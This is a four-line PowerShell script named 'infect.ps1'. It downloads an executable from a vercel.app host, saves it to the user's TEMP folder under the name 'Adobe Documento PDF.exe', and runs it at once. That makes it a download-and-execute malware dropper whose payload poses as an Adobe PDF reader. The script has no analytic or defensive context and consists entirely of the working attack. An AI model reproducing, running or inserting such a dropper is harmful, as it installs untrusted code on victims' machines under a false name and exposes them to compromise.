# infect.ps1
$payload = "https://testando123-blond.vercel.app/Adobe%20-%20Leitor%20de%20PDF.exe";
Invoke-WebRequest $payload -OutFile "$env:TEMP\Adobe Documento PDF.exe";
Start-Process "$env:TEMP\Adobe Documento PDF.exe";
